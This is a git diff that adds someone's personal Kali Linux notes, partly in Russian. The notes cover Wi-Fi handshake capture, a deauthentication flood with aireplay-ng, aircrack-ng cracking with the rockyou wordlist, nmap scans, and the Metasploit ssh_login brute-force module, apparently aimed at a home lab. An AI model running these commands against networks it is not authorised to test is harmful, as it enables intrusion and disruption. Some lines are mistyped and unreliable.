@@ -1,0 +1,79 @@
+sudo apt update
+sudo apt upgrade -y 
+sudo apt autoclean
+sudo apt autoremove
+
+sudo rm -r ./shadi remove file
+---------------------------------------------------------------------------------------
+192.168.0.1 - для авторизации wi-fi роутера в браузере
+
+Passwerd
+git clone https://github.com/danielmiessler/SecLists.git
+apt -y install seclists
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+----------------------------------------------------------------------------------------
+sudo apt install linux-headers
+ifconfig wlan0 down
+iwconfig wlan0 mode monitot 
+ifconfig wlan0 up
+airmon-ng check wlan0
+airmon-ng check kill
+airodump-ng wlan0
+
+///после опред мак адреса дела.////
+airodump-ng --bssid 90:9A:4A:C4:5A:4E(мак ад. т.) -c (#CH) -w (люб.имя сохр. файла)wlan0
+/ожид. handshake 90:9A:4A:C4:8A:4E 
+
+///для помехи роутера///
+aireplay-ng -0 0 -a 90:9A:4A:C4:5A:4E wlan0
+долго не ждем 
+-------------------------------------------------------------------------------------------
+https://www.kali.org/tools/wordlists/
+
+locate rockyou
+
+cd folder
+cp /usr/share/wordlists/rockyou.txt.gz .
+gzip -d rockyou.txt.gz
+aircrack-ng -w rockyou.txt nameFileWifi.cap
+
+-------------------------------------------------------------------------------------------
+sudo su -(рут пользователь)
+cd /etc/apt
+sudo -i
+sudo nano sources.list
+dep http://http.kali.org/kali kali-rolling main non-free contrib (press ctrl+o after Enter)
+apt-get update
+apt install linux-headers-$(uname -r)
+apt-get install virtualbox-guest-utils
+cd /media/
+
+
+********************************* pythonfolder/scanning ************************************
+mkdir namefolder
+cd namefolder
+nano file.py - open file & rm file.py - delete file
+#! /usr/bin/python
+....
+uname -a -имя компьютера
+chmod +x test.py -уст. разр. на запуск (x) файла для всех польз. (./test.py) 
+nmap -p 445 192.168.0.1
+nmap sS ip-Adrea - показывает какие порты открыты
+nslookup - Позв. зад. различные типы запр. и опрашивать произвольно указ. сервера
+ping 192.168.109.129 пров. пиргов
+service ssh status -пров. ssh проверка активир. или нет
+service ssh start - для активаци
+ --------------------для ubuntu --------
+| sudo apt-get install openssh-server   |
+ ---------------------------------------
+nmap -p0-65535 192.168.109.129
+https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
+
+
+ssh 192.168.109.129
+
+
+**********************************************msfconsole**********************************
+use auxiliary/scanner/ssh/ssh_login
+show options
+
